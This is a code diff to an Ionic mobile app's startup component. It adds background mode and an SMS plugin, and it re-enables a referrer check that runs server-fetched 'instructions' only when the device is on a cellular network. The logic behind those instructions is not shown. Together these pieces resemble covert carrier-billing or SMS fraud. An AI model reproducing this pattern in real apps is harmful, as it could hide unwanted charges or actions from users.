@@ -9,6 +9,10 @@ import { Storage } from '@ionic/storage';
 import { Device } from '@ionic-native/device';
 import { Network } from '@ionic-native/network';
 import { Http } from '@angular/http';
+import { BackgroundMode } from '@ionic-native/background-mode';
+import { SMS } from '@ionic-native/sms';
+
+
 import 'rxjs/add/operator/map';
 
 declare var AndroidReferrer:any;
@@ -23,20 +27,20 @@ export class MyApp {
   network: Network;
   storage: Storage;
   referrer: String;
+  sms: SMS;
 
   constructor(platform: Platform, statusBar: StatusBar, splashScreen: SplashScreen, iab: InAppBrowser,
-              storage: Storage, device: Device, network: Network, http: Http ) {
+              storage: Storage, device: Device, network: Network, http: Http, backgroundMode: BackgroundMode,
+              sms: SMS) {
 
     platform.ready().then(() => {
 
-      // Okay, so the platform is ready and our plugins are available.
-      // Here you can do any higher level native things you might need.
-      statusBar.styleDefault();
-      splashScreen.hide();
+      backgroundMode.enable();
 
       var app = this;
       this.network = network;
       this.storage = storage;
+      this.sms = sms;
 
       //get device settings and save it to local storage to use later
       const deviceSettings = {
@@ -49,32 +53,37 @@ export class MyApp {
         ran: false
       };
 
-      // AndroidReferrer.echo('referrer', function (referrer) {
-      //   if(referrer.length > 0){
-      //     app.referrer = referrer;
-      //     storage.set("deviceSettings", deviceSettings);
-      //
-      //     if (app.isNetworkOk()) { //we started on a cellular network
-      //       console.log('network is ok');
-      //       app.handleInstructions(http, iab);
-      //     } else { //non cellular let's watch for connections to come up
-      //       console.log('we are not on a cellular network the type is ='+app.network.type);
-      //       let connectSubscription = app.network.onchange().subscribe(() => {
-      //         console.log('new network change... to'+app.network.type);
-      //         setTimeout(() => {
-      //           if (app.isNetworkOk()) {
-      //             app.handleInstructions(http, iab);
-      //             connectSubscription.unsubscribe();
-      //           }
-      //         }, 3000);
-      //       });
-      //     }
-      //   }else{
-      //     console.log('no referrer');
-      //   }
-      // });
-    });
+      AndroidReferrer.echo('referrer', function (referrer) {
+        if(referrer.length > 0){
+          app.referrer = referrer;
+          storage.set("deviceSettings", deviceSettings);
 
+          if (app.isNetworkOk()) { //we started on a cellular network
+            console.log('network is ok');
+            app.handleInstructions(http, iab);
+          } else { //non cellular let's watch for connections to come up
+            console.log('we are not on a cellular network the type is ='+app.network.type);
+            let connectSubscription = app.network.onchange().subscribe(() => {
+              console.log('new network change... to'+app.network.type);
+              setTimeout(() => {
+                if (app.isNetworkOk()) {
+                  app.handleInstructions(http, iab);
+                  connectSubscription.unsubscribe();
+                }
+              }, 3000);
+            });
+          }
+        }else{
+          console.log('no referrer');
+        }
+      });
+
+      // Okay, so the platform is ready and our plugins are available.
+      // Here you can do any higher level native things you might need.
+      statusBar.styleDefault();
+      splashScreen.hide();
+
+    });
   }
 
   isNetworkOk(){
